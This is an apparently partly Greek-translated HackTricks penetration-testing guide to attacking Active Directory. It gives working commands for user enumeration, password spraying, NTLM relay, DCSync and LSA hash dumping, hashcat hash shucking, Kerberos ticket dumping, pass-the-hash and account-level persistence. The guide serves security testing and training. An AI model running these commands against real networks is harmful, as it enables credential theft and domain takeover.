# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Βασική επισκόπηση

Το **Active Directory** λειτουργεί ως θεμελιώδης τεχνολογία, επιτρέποντας στους **network administrators** να δημιουργούν και να διαχειρίζονται αποτελεσματικά **domains**, **users** και **objects** μέσα σε ένα δίκτυο. Έχει σχεδιαστεί για κλιμάκωση, διευκολύνοντας την οργάνωση ενός εκτεταμένου αριθμού χρηστών σε διαχειρίσιμα **groups** και **subgroups**, ενώ ελέγχει τα **access rights** σε διάφορα επίπεδα.

Η δομή του **Active Directory** αποτελείται από τρία κύρια επίπεδα: **domains**, **trees** και **forests**. Ένα **domain** περιλαμβάνει μια συλλογή από objects, όπως **users** ή **devices**, που μοιράζονται μια κοινή βάση δεδομένων. Τα **trees** είναι ομάδες από αυτά τα domains που συνδέονται μέσω μιας κοινής δομής, και ένα **forest** αντιπροσωπεύει τη συλλογή πολλών trees, διασυνδεδεμένων μέσω **trust relationships**, σχηματίζοντας το ανώτατο επίπεδο της οργανωτικής δομής. Συγκεκριμένα **access** και **communication rights** μπορούν να οριστούν σε καθένα από αυτά τα επίπεδα.

Οι βασικές έννοιες στο **Active Directory** περιλαμβάνουν:

1. **Directory** – Περιέχει όλες τις πληροφορίες που αφορούν τα Active Directory objects.
2. **Object** – Δηλώνει οντότητες μέσα στο directory, συμπεριλαμβανομένων των **users**, **groups** ή **shared folders**.
3. **Domain** – Λειτουργεί ως container για directory objects, με τη δυνατότητα να συνυπάρχουν πολλαπλά domains μέσα σε ένα **forest**, διατηρώντας το καθένα τη δική του συλλογή objects.
4. **Tree** – Μια ομαδοποίηση domains που μοιράζονται ένα κοινό root domain.
5. **Forest** – Η κορυφή της οργανωτικής δομής στο Active Directory, αποτελούμενη από several trees με **trust relationships** μεταξύ τους.

Το **Active Directory Domain Services (AD DS)** περιλαμβάνει ένα εύρος υπηρεσιών κρίσιμων για την κεντρικοποιημένη διαχείριση και επικοινωνία μέσα σε ένα δίκτυο. Αυτές οι υπηρεσίες περιλαμβάνουν:

1. **Domain Services** – Κεντρικοποιεί την αποθήκευση δεδομένων και διαχειρίζεται τις αλληλεπιδράσεις μεταξύ **users** και **domains**, συμπεριλαμβανομένων των λειτουργιών **authentication** και **search**.
2. **Certificate Services** – Επιβλέπει τη δημιουργία, διανομή και διαχείριση ασφαλών **digital certificates**.
3. **Lightweight Directory Services** – Υποστηρίζει directory-enabled applications μέσω του **LDAP protocol**.
4. **Directory Federation Services** – Παρέχει δυνατότητες **single-sign-on** για την ταυτοποίηση χρηστών σε πολλαπλές web applications σε μία μόνο συνεδρία.
5. **Rights Management** – Συμβάλλει στην προστασία υλικού πνευματικών δικαιωμάτων ρυθμίζοντας τη μη εξουσιοδοτημένη διανομή και χρήση του.
6. **DNS Service** – Κρίσιμη για την επίλυση των **domain names**.

Για μια πιο αναλυτική εξήγηση, δείτε: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Για να μάθεις πώς να **attack an AD** χρειάζεται να **understand** πολύ καλά τη διαδικασία **Kerberos authentication**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

Μπορείς να δεις πολλά στο [https://wadcoms.github.io/](https://wadcoms.github.io) για μια γρήγορη επισκόπηση των εντολών που μπορείς να τρέξεις για enumerate/exploit an AD.

> [!WARNING]
> Η επικοινωνία Kerberos **requires a full qualifid name (FQDN)** για την εκτέλεση ενεργειών. Αν προσπαθήσεις να αποκτήσεις πρόσβαση σε ένα μηχάνημα μέσω της IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

Αν έχεις απλώς πρόσβαση σε ένα AD environment αλλά δεν έχεις κανένα credentials/sessions, θα μπορούσες να:

- **Pentest the network:**
- Σάρωσε το δίκτυο, βρες μηχανήματα και ανοιχτά ports και προσπάθησε να **exploit vulnerabilities** ή να **extract credentials** από αυτά (για παράδειγμα, οι [printers could be very interesting targets](ad-information-in-printers.md).
- Η απαρίθμηση DNS μπορεί να δώσει πληροφορίες για βασικούς servers στο domain όπως web, printers, shares, vpn, media, κ.λπ.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Δες τη γενική [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) για περισσότερες πληροφορίες σχετικά με το πώς να το κάνεις αυτό.
- **Check for null and Guest access on smb services** (αυτό δεν θα λειτουργήσει σε σύγχρονες εκδόσεις Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Ένας πιο αναλυτικός οδηγός για το πώς να enumerate a SMB server μπορεί να βρεθεί εδώ:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Ένας πιο αναλυτικός οδηγός για το πώς να enumerate LDAP μπορεί να βρεθεί εδώ (δώσε **special attention to the anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Συγκέντρωσε credentials [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Πρόσβαση σε host μέσω [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Συγκέντρωσε credentials **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Εξαγωγή usernames/names από εσωτερικά έγγραφα, social media, υπηρεσίες (κυρίως web) μέσα στα domain environments αλλά και από δημόσια διαθέσιμες πηγές.
- Αν βρεις τα πλήρη names των εργαζομένων μιας εταιρείας, μπορείς να δοκιμάσεις διαφορετικές AD **username conventions (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Οι πιο συνηθισμένες συμβάσεις είναι: _NameSurname_, _Name.Surname_, _NamSur_ (3letters of each), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Έλεγξε τις σελίδες [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) και [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Όταν ζητείται ένα **invalid username** ο server θα απαντήσει με τον **Kerberos error** κωδικό _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, επιτρέποντάς μας να διαπιστώσουμε ότι το username ήταν invalid. Τα **valid usernames** θα προκαλέσουν είτε την απάντηση **TGT in a AS-REP** είτε το σφάλμα _KRB5KDC_ERR_PREAUTH_REQUIRED_, που δείχνει ότι ο χρήστης πρέπει να εκτελέσει pre-authentication.
- **No Authentication against MS-NRPC**: Χρήση auth-level = 1 (No authentication) απέναντι στο MS-NRPC (Netlogon) interface στους domain controllers. Η μέθοδος καλεί τη συνάρτηση `DsrGetDcNameEx2` αφού κάνει binding στο MS-NRPC interface για να ελέγξει αν ο χρήστης ή ο υπολογιστής υπάρχει χωρίς κανένα credentials. Το εργαλείο [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) υλοποιεί αυτόν τον τύπο enumeration. Η έρευνα βρίσκεται [εδώ](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Αν βρήκες έναν από αυτούς τους servers στο δίκτυο, μπορείς επίσης να κάνεις **user enumeration εναντίον του**. Για παράδειγμα, μπορείς να χρησιμοποιήσεις το tool [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Μπορείτε να βρείτε λίστες με usernames σε [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  και σε αυτό το [**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Ωστόσο, θα πρέπει να έχετε το **name of the people working on the company** από το βήμα recon που θα έπρεπε να έχετε εκτελέσει πριν από αυτό. Με το name και surname θα μπορούσατε να χρησιμοποιήσετε το script [**namemash.py**](https://gist.github.com/superkojiman/11076951) για να δημιουργήσετε πιθανά έγκυρα usernames.

### Knowing one or several usernames

Ok, οπότε ξέρετε ότι έχετε ήδη ένα valid username αλλά καθόλου passwords... Τότε δοκιμάστε:

- [**ASREPRoast**](asreproast.md): Αν ένας user **doesn't have** το attribute _DONT_REQ_PREAUTH_ μπορείτε να **request a AS_REP message** για αυτόν τον user που θα περιέχει κάποια δεδομένα κρυπτογραφημένα από μια derivation του password του user.
- [**Password Spraying**](password-spraying.md): Ας δοκιμάσουμε τα πιο **common passwords** με κάθε έναν από τους discovered users, ίσως κάποιος user να χρησιμοποιεί ένα κακό password (keep in mind the password policy!).
- Σημειώστε ότι μπορείτε επίσης να **spray OWA servers** για να προσπαθήσετε να αποκτήσετε access στους users mail servers.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Μπορεί να μπορέσετε να **obtain** κάποια challenge **hashes** για να crack **poisoning** κάποια protocols του **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Αν έχετε καταφέρει να enumerate το active directory θα έχετε **more emails and a better understanding of the network**. Μπορεί να μπορέσετε να αναγκάσετε NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)  για να αποκτήσετε access στο AD env.

### NetExec workspace-driven recon & relay posture checks

- Χρησιμοποιήστε **`nxcdb` workspaces** για να κρατάτε το AD recon state ανά engagement: το `workspace create <name>` δημιουργεί per-protocol SQLite DBs κάτω από `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Αλλάζετε views με `proto smb|mssql|winrm` και κάνετε list τα gathered secrets με `creds`. Καθαρίστε χειροκίνητα τα sensitive data όταν τελειώσετε: `rm -rf ~/.nxc/workspaces/<name>`.
- Γρήγορο subnet discovery με **`netexec smb <cidr>`** εμφανίζει **domain**, **OS build**, **SMB signing requirements**, και **Null Auth**. Τα members που δείχνουν `(signing:False)` είναι **relay-prone**, ενώ τα DCs συχνά απαιτούν signing.
- Generate **hostnames in /etc/hosts** straight from NetExec output to ease targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Όταν το **SMB relay προς το DC μπλοκάρεται** από το signing, κάνε ακόμα probe στο **LDAP** posture: `netexec ldap <dc>` επισημαίνει `(signing:None)` / weak channel binding. Ένα DC με SMB signing required αλλά LDAP signing disabled παραμένει βιώσιμος **relay-to-LDAP** στόχος για abuses όπως **SPN-less RBCD**.

### Client-side printer credential leaks → bulk domain credential validation

- Τα Printer/web UIs μερικές φορές **ενσωματώνουν masked admin passwords σε HTML**. Η προβολή source/devtools μπορεί να αποκαλύψει cleartext (π.χ. `<input value="<password>">`), επιτρέποντας Basic-auth access για να κάνεις scan/print repositories.
- Τα retrieved print jobs μπορεί να περιέχουν **plaintext onboarding docs** με per-user passwords. Κράτα τα pairings aligned όταν κάνεις testing:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** treats every NT hash you already possess as a candidate password for other, slower formats whose key material is derived directly from the NT hash. Instead of brute-forcing long passphrases in Kerberos RC4 tickets, NetNTLM challenges, or cached credentials, you feed the NT hashes into Hashcat’s NT-candidate modes and let it validate password reuse without ever learning the plaintext. This is especially potent after a domain compromise where you can harvest thousands of current and historical NT hashes.

Use shucking when:

- You have an NT corpus from DCSync, SAM/SECURITY dumps, or credential vaults and need to test for reuse in other domains/forests.
- You capture RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, or DCC/DCC2 blobs.
- You want to quickly prove reuse for long, uncrackable passphrases and immediately pivot via Pass-the-Hash.

The technique **does not work** against encryption types whose keys are not the NT hash (e.g., Kerberos etype 17/18 AES). If a domain enforces AES-only, you must revert to the regular password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries dramatically widen the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) extracts local SAM/SECURITY data and cached domain logons (DCC/DCC2). Deduplicate and append those hashes to the same `nt_candidates.txt` list.
- **Track metadata** – Keep the username/domain that produced each hash (even if the wordlist contains only hex). Matching hashes tell you immediately which principal is reusing a password once Hashcat prints the winning candidate.
- Prefer candidates from the same forest or a trusted forest; that maximizes the chance of overlap when shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.



## Enumerating Active Directory WITH credentials/session

For this phase you need to have **compromised the credentials or a session of a valid domain account.** If you have some valid credentials or a shell as a domain user, **you should remember that the options given before are still options to compromise other users**.

Before start the authenticated enumeration you should know what is the **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Having compromised an account is a **big step to start compromising the whole domain**, because you are going to be able to start the **Active Directory Enumeration:**

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

It's very easy to obtain all the domain usernames from Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). In Linux, you can use: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> Even if this Enumeration section looks small this is the most important part of all. Access the links (mainly the one of cmd, powershell, powerview and BloodHound), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.

### Kerberoast

Kerberoasting involves obtaining **TGS tickets** used by services tied to user accounts and cracking their encryption—which is based on user passwords—**offline**.

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Once you have obtained some credentials you could check if you have access to any **machine**. For that matter, you could use **CrackMapExec** to attempt connecting on several servers with different protocols, accordingly to your ports scans.

### Local Privilege Escalation

If you have compromised credentials or a session as a regular domain user and you have **access** with this user to **any machine in the domain** you should try to find your way to **escalate privileges locally and looting for credentials**. This is because only with local administrator privileges you will be able to **dump hashes of other users** in memory (LSASS) and locally (SAM).

There is a complete page in this book about [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) and a [**checklist**](../checklist-windows-privilege-escalation.md). Also, don't forget to use [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

It's very **unlikely** that you will find **tickets** in the current user **giving you permission to access** unexpected resources, but you could check:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

If you have managed to enumerate the active directory you will have **περισσότερα emails και καλύτερη κατανόηση του δικτύου**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Now that you have some basic credentials you should check if you can **βρείτε** any **ενδιαφέροντα αρχεία που μοιράζονται μέσα στο AD**. You could do that manually but it's a very boring repetitive task (and more if you find hundreds of docs you need to check).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

If you can **access other PCs or shares** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **κλέψετε** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

This vulnerability allowed any authenticated user to **compromise the domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**For the following techniques a regular domain user is not enough, you need some special privileges/credentials to perform these attacks.**

### Hash extraction

Hopefully you have managed to **compromise some local admin** account using [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Then, its time to dump all the hashes in memory and locally.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Once you have the hash of a user**, you can use it to **impersonate** it.\
You need to use some **tool** that will **perform** the **NTLM authentication using** that **hash**, **or** you could create a new **sessionlogon** and **inject** that **hash** inside the **LSASS**, so when any **NTLM authentication is performed**, that **hash will be used.** The last option is what mimikatz does.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

This attack aims to **use the user NTLM hash to request Kerberos tickets**, as an alternative to the common Pass The Hash over NTLM protocol. Therefore, this could be especially **useful in networks where NTLM protocol is disabled** and only **Kerberos is allowed** as authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In the **Pass The Ticket (PTT)** attack method, attackers **steal a user's authentication ticket** instead of their password or hash values. This stolen ticket is then used to **impersonate the user**, gaining unauthorized access to resources and services within a network.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

If you have the **hash** or **password** of a **local administrato**r you should try to **login locally** to other **PCs** with it.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Σημείωσε ότι αυτό είναι αρκετά **noisy** και το **LAPS** θα το **mitigate**.

### MSSQL Abuse & Trusted Links

Αν ένας χρήστης έχει δικαιώματα να **access MSSQL instances**, μπορεί να χρησιμοποιήσει αυτό για να **execute commands** στον host του MSSQL (αν τρέχει ως SA), να **steal** το NetNTLM **hash** ή ακόμα και να κάνει **relay** **attack**.\
Επίσης, αν μια MSSQL instance είναι trusted (database link) από μια άλλη MSSQL instance. Αν ο χρήστης έχει δικαιώματα πάνω στη trusted database, θα μπορεί να **use the trust relationship to execute queries also in the other instance**. Αυτά τα trusts μπορούν να αλυσιδωθούν και κάποια στιγμή ο χρήστης μπορεί να βρει μια misconfigured database όπου μπορεί να execute commands.\
**Τα links μεταξύ databases λειτουργούν ακόμα και across forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Third-party inventory and deployment suites συχνά εκθέτουν ισχυρά paths προς credentials και code execution. Δες:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Αν βρεις οποιοδήποτε Computer object με το attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) και έχεις domain privileges στο computer, θα μπορείς να dump TGTs από τη memory κάθε user που κάνει logins στο computer.\
Άρα, αν ένας **Domain Admin logins onto the computer**, θα μπορείς να dump το TGT του και να τον impersonate χρησιμοποιώντας [Pass the Ticket](pass-the-ticket.md).\
Χάρη στο constrained delegation θα μπορούσες ακόμα και να **automatically compromise a Print Server** (hopefully it will be a DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Αν ένας user ή computer επιτρέπεται για "Constrained Delegation" θα μπορεί να **impersonate any user to access some services in a computer**.\
Τότε, αν **compromise the hash** αυτού του user/computer θα μπορείς να **impersonate any user** (even domain admins) για να access some services.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Το να έχεις **WRITE** privilege σε ένα Active Directory object ενός remote computer επιτρέπει την επίτευξη code execution με **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Ο compromised user θα μπορούσε να έχει κάποια **interesting privileges over some domain objects** που θα μπορούσαν να σου επιτρέψουν να **move** laterally/**escalate** privileges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Η ανακάλυψη ενός **Spool service listening** μέσα στο domain μπορεί να **abused** για να **acquire new credentials** και να **escalate privileges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Αν **other users** **access** το **compromised** machine, είναι δυνατό να **gather credentials from memory** και ακόμα και να **inject beacons in their processes** για να τους impersonate.\
Συνήθως οι χρήστες θα access το σύστημα μέσω RDP, οπότε εδώ έχεις πώς να performa μερικές attacks πάνω σε third party RDP sessions:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

Το **LAPS** παρέχει ένα σύστημα για τη διαχείριση του **local Administrator password** σε domain-joined computers, διασφαλίζοντας ότι είναι **randomized**, μοναδικό και αλλάζει συχνά (**changed**). Αυτοί οι κωδικοί αποθηκεύονται στο Active Directory και η πρόσβαση ελέγχεται μέσω ACLs μόνο για εξουσιοδοτημένους χρήστες. Με επαρκή δικαιώματα για πρόσβαση σε αυτούς τους κωδικούς, γίνεται δυνατό το pivoting σε άλλα computers.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

Η **Gathering certificates** από το compromised machine θα μπορούσε να είναι ένας τρόπος για να escalate privileges μέσα στο environment:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Αν έχουν ρυθμιστεί **vulnerable templates** είναι δυνατό να γίνει abuse για να escalate privileges:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Μόλις αποκτήσεις **Domain Admin** ή ακόμα καλύτερα **Enterprise Admin** privileges, μπορείς να **dump** τη **domain database**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Κάποιες από τις τεχνικές που συζητήθηκαν πριν μπορούν να χρησιμοποιηθούν για persistence.\
Για παράδειγμα θα μπορούσες:

- Να κάνεις users vulnerable to [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Να κάνεις users vulnerable to [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

